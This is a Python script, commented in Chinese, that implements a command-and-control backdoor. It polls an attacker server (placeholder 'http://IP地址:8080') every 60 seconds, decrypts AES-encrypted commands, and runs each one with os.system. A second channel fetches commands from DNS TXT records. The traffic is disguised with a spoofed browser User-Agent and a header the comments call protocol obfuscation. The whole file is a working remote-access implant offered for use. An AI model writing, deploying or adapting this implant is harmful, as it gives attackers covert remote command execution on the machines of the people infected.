import requests
import time
import os
from Crypto.Cipher import AES
import base64
import json
import string
import dns.resolver

# AES加密和解密函数
def decrypt(ciphertext, key):
    try:
        raw_data = base64.b64decode(ciphertext)
        nonce = raw_data[:16]
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        plaintext = cipher.decrypt(raw_data[16:])
        return plaintext.decode()
    except Exception as e:
        print(f'Decryption error: {e}')
        return None

def execute_command(command):
    print(f'Executing command: {command}')  # 日志输出，调试命令
    os.system(command)

def dns_query(domain):
    resolver = dns.resolver.Resolver()
    response = resolver.resolve(domain, 'TXT')
    return response

def is_valid_base64(s):
    try:
        if isinstance(s, str):
            s = s.encode('ascii')
        return base64.b64encode(base64.b64decode(s)) == s
    except Exception:
        return False

def main(c2_url, encryption_key):
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",  # 流量伪装为常见邮件客户端
        "X-Custom-Protocol": "custom-protocol"  # 协议混淆
    }
    while True:
        try:
            response = requests.get(c2_url, headers=headers)
            if response.status_code == 200:
                data = json.loads(response.text)
                encrypted_command = data["payload"]
                command_with_padding = decrypt(encrypted_command, encryption_key)
                if command_with_padding:
                    print(f'Received command with padding: {command_with_padding}')  # 添加日志输出，查看解密后命令
                    command = command_with_padding.split('<<<END>>>')[0]  # 使用特定分隔符解析命令
                    print(f'Clean command: {command}')  # 添加日志输出，查看清理后的命令
                    execute_command(command)
        except Exception as e:
            print(f'Error connecting to C2 server: {e}')

        # 使用DNS隧道进行数据隐藏（伪造的DNS查询）
        try:
            domain = "example.com"  # 替换为合法域名或C2服务器域名
            dns_response = dns_query(domain)
            for txt_record in dns_response:
                encrypted_command = txt_record.to_text().strip('"')
                if is_valid_base64(encrypted_command) and '<<<END>>>' in encrypted_command:
                    command_with_padding = decrypt(encrypted_command, encryption_key)
                    if command_with_padding:
                        command = command_with_padding.split('<<<END>>>')[0]  # 使用特定分隔符解析命令
                        execute_command(command)
                else:
                    print(f'Invalid base64 content or missing delimiter: {encrypted_command}')
        except Exception as e:
            print(f'Error using DNS tunnel: {e}')

        # 心跳间隔时间（例如，60秒）
        time.sleep(60)

if __name__ == '__main__':
    c2_url = 'http://IP地址:8080/dns_query'  # 替换为攻击者主机IP地址
    encryption_key = b'0123456789abcdef'  # 16字节AES密钥
    main(c2_url, encryption_key)
